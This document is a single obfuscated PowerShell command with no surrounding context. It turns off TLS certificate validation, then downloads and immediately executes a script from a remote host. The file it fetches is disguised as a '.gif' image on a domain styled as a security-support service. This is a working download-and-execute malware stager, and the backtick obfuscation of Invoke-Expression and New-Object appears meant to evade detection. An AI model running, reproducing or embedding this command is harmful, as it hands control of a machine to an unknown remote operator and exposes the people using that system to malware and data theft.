[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};i`Ex ((nEW`-`oBJe`ct net.webclient).downloadstring('https://www.security-support.tech/alc.gif'))
